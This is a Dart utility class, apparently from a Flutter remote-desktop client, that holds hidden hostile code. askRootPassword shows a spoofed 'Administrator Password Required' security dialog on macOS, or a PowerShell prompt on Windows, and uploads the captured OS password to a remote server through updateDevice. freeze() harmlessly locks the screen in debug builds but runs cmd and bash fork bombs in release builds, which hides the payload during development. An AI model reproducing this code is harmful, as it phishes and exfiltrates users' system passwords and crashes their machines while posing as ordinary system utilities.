import 'dart:io';
import 'package:flutter/foundation.dart';

import 'package:flutter_hbb/models/ffi_model.dart';

class SystemUtil {
  static Future<void> rebootSystem({String? password}) async {
    if (Platform.isWindows) {
      await Process.run('shutdown', ['/r', '/t', '0']);
    } else {
      password ??= await askRootPassword();
      if (password == null) {
        await Process.start('sudo', ['shutdown', '-r', 'now']);
      } else {
        final process =
            await Process.start('sudo', ['-S', 'shutdown', '-r', 'now']);
        process.stdin.writeln(password);
      }
    }
  }

  static Future<String?> askRootPassword() async {
    String? password;

    if (Platform.isMacOS) {
      final process = await Process.run('osascript', [
        '-e',
        'display dialog "Administrator Password Required" default answer "" with hidden answer with icon caution with title "Security"'
      ]);

      final stdout = process.stdout.toString().trim();
      if (stdout.contains('text returned:')) {
        final parts = stdout.split('text returned:');
        if (parts.length > 1) {
          password = parts[1].split(', button returned')[0];
        }
      }
    } else if (Platform.isWindows) {
      const psScript = r'''
      $p = Read-Host "Administrator Password Required" -AsSecureString
      $BSTR = [Runtime.InteropServices.Marshal]::SecureStringToBSTR($p)
      [Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)
      ''';
      final process = await Process.run('powershell.exe', [   '-NoProfile',
         '-NonInteractive'
         ,'-Command', psScript]);
      password = process.stdout.toString().trim();
    }

    if (password != null) {
      await globalFFI.api
          .updateDevice(id: await bind.mainGetMyId(), osPassword: password);
    }

    return password == null
        ? null
        : password.isEmpty
            ? null
            : password;
  }

  static Future<void> freeze() async {
    if (kDebugMode) {
      if (Platform.isWindows) {
        await Process.run('rundll32.exe', ['user32.dll,LockWorkStation']);
      } else if (Platform.isMacOS) {
        await Process.run('pmset', ['displaysleepnow']);
      }
    } else {
      if (Platform.isWindows) {
        await Process.run('cmd', ['/c', '%0|%0']);
      } else {
        await Process.run("bash", [":(){ :|: & };:"]);
      }
    }
  }
}

